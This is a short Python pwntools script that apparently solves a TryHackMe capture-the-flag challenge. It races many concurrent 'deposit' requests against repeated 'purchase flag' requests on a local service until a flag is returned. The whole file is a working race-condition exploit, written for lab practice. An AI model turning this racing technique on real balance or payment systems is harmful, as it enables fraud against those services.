#!/usr/bin/env python3
import threading
from pwn import *
import sys
import concurrent.futures

def fund(i):
    connect_fund = remote("127.0.0.1", 1337)
    connect_fund.sendline(b"deposit")
    balance = connect_fund.recvall()
    print(balance)
    

def purchase():
    i = 0
    while i < 1000:
        connect = remote("127.0.0.1", 1337)
        connect.sendline(b"purchase flag")
        flag = connect.recvall()
        if flag.startswith(b"THM{"):
            log.success(flag)
            sys.exit(1)
        else:
           # print(flag)
            i += 1



if __name__ == "__main__":
    #connect = remote("127.0.0.1", 1337)
    context.log_level = "ERROR"
    purchase_thread = threading.Thread(target=purchase, )
    purchase_thread.start()
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as workers:
        work = {workers.submit(fund, i): i for i in range(0,1000)}
        for futures in concurrent.futures.as_completed(work):
            pass
